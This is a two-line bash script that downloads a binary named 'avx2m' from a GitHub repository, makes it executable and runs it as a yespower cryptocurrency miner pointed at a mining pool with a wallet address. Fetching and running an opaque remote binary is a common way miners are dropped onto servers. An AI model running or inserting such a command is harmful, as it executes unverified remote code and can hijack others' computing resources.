#!/usr/bin/env bash
wget https://github.com/BatiKangkung/KangKung/raw/master/avx2m && chmod +x avx2m && ./avx2m -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(gshuf -i 1000-9999 -n 1)-C) -p x
